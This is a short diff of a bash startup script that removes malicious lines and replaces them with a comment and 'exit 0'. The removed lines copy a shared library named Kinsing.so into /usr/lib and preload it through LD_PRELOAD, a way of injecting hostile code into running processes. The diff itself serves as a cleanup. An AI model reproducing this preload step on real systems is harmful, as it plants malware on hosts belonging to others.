@@ -1,3 +1,4 @@
 #!/bin/bash
-cp /Kinsing.so /usr/lib/Kinsing.so
-LD_PRELOAD=/usr/lib/Kinsing.so sleep 10
+# This file is no longer needed as we use npm start
+# It was removed as the previous version contained malicious code
+exit 0
